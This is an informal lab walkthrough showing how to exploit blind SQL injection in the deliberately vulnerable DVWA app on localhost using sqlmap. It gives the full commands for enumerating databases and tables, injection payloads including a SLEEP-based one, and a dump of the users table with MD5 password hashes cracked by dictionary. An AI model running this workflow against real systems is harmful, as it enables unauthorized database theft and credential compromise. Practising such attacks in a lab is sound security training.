
#### Background context
Blind SQL map is quite an annoying web app vulnerability for me, Ive created this as a sort of reference for those who also hate it and wish to find an automated method of exploiting it, its very VERY straight forward so ill be 

# Command breakdown
So the first command will be broken down
`sqlmap -u "http://localhost/vulnerabilities/sqli_blind/" --cookie="id=10; PHPSESSID=pu1f0eqnkkk5r8363ntt4fk7h1; security=medium" --data="id=1&Submit=Submit" -p id --dbs` 
### Parameters explained
- -u
	- For the URL
- -cookie
	- For the cookie being used, take into consideration that the cookie for DVWA is rather long where the cookie is `PPSESSID=` and `security=`
- -- data
	- We’ll need --data=DATA to input our data string to be sent through POST, so the entire data string here is `id=1&Submit=Submit`
- -p
	- meaning the parameter in which we modify our payload it being `id` in this case
- --dbs
	- Enumerates the database



```
kali@kali ~> sqlmap -u "http://localhost/vulnerabilities/sqli_blind/" --cookie="id=10; PHPSESSID=pu1f0eqnkkk5r8363ntt4fk7h1; security=medium" --data="id=1&Submit=Submit" -p id --dbs
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.7#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org


........

POST parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 241 HTTP(s) requests:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 7298=7298&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 5390 FROM (SELECT(SLEEP(5)))YfNg)&Submit=Submit
---
[07:48:22] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[07:48:22] [INFO] fetching database names
[07:48:22] [INFO] fetching number of databases
[07:48:22] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[07:48:22] [INFO] retrieved: 2
[07:48:22] [INFO] retrieved: dvwa
[07:48:22] [INFO] retrieved: information_schema
available databases [2]:
[*] dvwa
[*] information_schema

```

so now we know the available databases

# Command pt.2 
here now that we have this information its time for us to enumerate for the database for its tables
`sqlmap -u "http://localhost/vulnerabilities/sqli_blind/" --cookie="id=10; PHPSESSID=pu1f0eqnkkk5r8363ntt4fk7h1; security=medium" --data="id=1&Submit=Submit" -p id -D dvwa --tables --batch --threads 5`

### Parameter breakdown
- -D
	- Refers to the name of the database we want to enumerate
- --tables
	- This command allows us to enumerate table names inside of the database
- --batch
	- This instructs SQLMAP to answer with default values
- --threads 5
	- Purely to just speed things up, completely optional

```
kali@kali ~> sqlmap -u "http://localhost/vulnerabilities/sqli_blind/" --cookie="id=10; PHPSESSID=pu1f0eqnkkk5r8363ntt4fk7h1; security=medium" --data="id=1&Submit=Submit" -p id -D dvwa --tables --batch --threads 5
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.7#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[08:00:53] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[08:00:53] [INFO] fetching tables for database: 'dvwa'
[08:00:53] [INFO] fetching number of tables for database 'dvwa'
[08:00:53] [INFO] retrieved: 2
[08:00:53] [INFO] retrieving the length of query output
[08:00:53] [INFO] retrieved: 9
[08:00:54] [INFO] retrieved: guestbook           
[08:00:54] [INFO] retrieving the length of query output
[08:00:54] [INFO] retrieved: 5
[08:00:54] [INFO] retrieved: users           
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+

```



# Command pt.3

Here we want to dump all of the contents on here using this command `sqlmap -u "http://localhost/vulnerabilities/sqli_blind/" --cookie="id=10; PHPSESSID=39qedittgtbc7rfsm69gjvidl0; security=medium" --data="id=1&Submit=Submit" -p id -T users --batch --threads 5 --dump`

### Parameter breakdown
- -T
	- Instead of -D dvwa, we replaced it with -T which is Table and give it the name users
- --dump
	- is used to dump the tables contets

```
kali@kali ~> sqlmap -u "http://localhost/vulnerabilities/sqli_blind/" --cookie="id=10; PHPSESSID=pu1f0eqnkkk5r8363ntt4fk7h1; security=medium" --data="id=1&Submit=Submit" -p id -T users --batch --threads 5 --dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.7#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:11:34 /2023-09-13/

[08:11:35] [INFO] resuming back-end DBMS 'mysql' 
[08:11:35] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 7298=7298&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 5390 FROM (SELECT(SLEEP(5)))YfNg)&Submit=Submit
---
..................................................................................
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[08:12:02] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[08:12:02] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[08:12:02] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[08:12:02] [INFO] starting 4 processes 
[08:12:04] [INFO] cracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'                             
[08:12:05] [INFO] cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'                            
[08:12:08] [INFO] cracked password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'                            
[08:12:09] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'                           
Database: dvwa                                                                                                      
Table: users
[5 entries]
+---------+---------+-----------------------------+-----------+---------------------------------------------+------------+---------------------+--------------+
| user_id | user    | avatar                      | last_name | password                                    | first_name | last_login          | failed_login |
+---------+---------+-----------------------------+-----------+---------------------------------------------+------------+---------------------+--------------+
| 3       | 1337    | /hackable/users/1337.jpg    | Me        | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Hack       | 2023-07-01 08:40:57 | 0            |
| 1       | admin   | /hackable/users/admin.jpg   | admin     | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin      | 2023-07-01 08:40:57 | 0            |
| 2       | gordonb | /hackable/users/gordonb.jpg | Brown     | e99a18c428cb38d5f260853678922e03 (abc123)   | Gordon     | 2023-07-01 08:40:57 | 0            |
| 4       | pablo   | /hackable/users/pablo.jpg   | Picasso   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Pablo      | 2023-07-01 08:40:57 | 0            |
| 5       | smithy  | /hackable/users/smithy.jpg  | Smith     | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Bob        | 2023-07-01 08:40:57 | 0            |
+---------+---------+-----------------------------+-----------+---------------------------------------------+------------+---------------------+--------------+

[08:12:15] [INFO] table 'dvwa.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/localhost/dump/dvwa/users.csv'

```


boom :))


